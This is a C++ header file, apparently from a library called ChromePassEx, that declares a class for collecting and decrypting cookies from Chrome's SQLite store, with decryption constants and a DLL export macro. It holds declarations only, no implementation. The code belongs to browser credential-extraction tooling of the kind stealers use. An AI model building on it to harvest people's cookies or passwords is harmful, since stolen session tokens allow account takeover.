#pragma once
#include "WinApiImport.h"
#include "sqlite3.h"
#include "ChromeCollecter.h"
#include <string>
#include <vector>


#ifdef ChromePassEx_EXPORTS

#define EXPORT_F __declspec(dllexport)

	#else

#define EXPORT_F 

#endif


#define V10_LEN 3
#define NONCE_LEN 12


struct CookieData
{
	std::string hostKey;
	std::string name;
	std::string value;
	std::string path;
	std::string expireUTC;
};

class  EXPORT_F ChromeCookiesCollecter : public ChromeCollecter<CookieData>
{
public:
	ChromeCookiesCollecter() : ChromeCollecter<CookieData>() {}
	~ChromeCookiesCollecter() {}
	std::vector<CookieData> collectData() override;

protected:

	void collectFromPath(const std::string& chromePath) override;
	bool getDbPath(const std::string& chromePath) override;
	ChromeDecrypt m_decryptor;

};

 

